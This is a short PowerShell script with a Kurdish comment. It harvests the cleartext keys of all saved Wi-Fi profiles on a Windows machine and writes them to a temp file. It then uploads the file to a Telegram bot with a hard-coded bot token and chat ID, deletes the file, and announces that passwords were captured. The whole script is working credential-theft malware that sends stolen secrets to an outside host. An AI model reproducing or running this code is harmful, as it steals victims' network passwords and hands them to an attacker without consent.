$t = "8055439877:AAHqPyyYm79putLyxCDa3bED7KHTdWo1T80"
$i = "8597805144"
$p = "$env:TEMP\w.txt"

if (Test-Path $p) { Remove-Item $p -Force }

# دۆزینەوەی پاسۆردەکان بە شێوازێکی سادەتر بۆ ئەوەی کەوانەکان تێک نەنیشن
netsh wlan show profiles | Select-String "\:(.+)$" | % {
    $n = $_.Matches.Groups[1].Value.Trim()
    $c = netsh wlan show profile name="$n" key=clear
    $pass = ($c | Select-String "Key Content\W+\:(.+)$").Matches.Groups[1].Value.Trim()
    if ($pass) { "$n : $pass" | Out-File $p -Append }
}

if (Test-Path $p) {
    curl.exe -F "document=@$p" "https://api.telegram.org/bot$t/sendDocument?chat_id=$i"
    Remove-Item $p -Force
}

$s = New-Object -ComObject SAPI.SpVoice
$s.Speak("Passwords Captured Successfully")
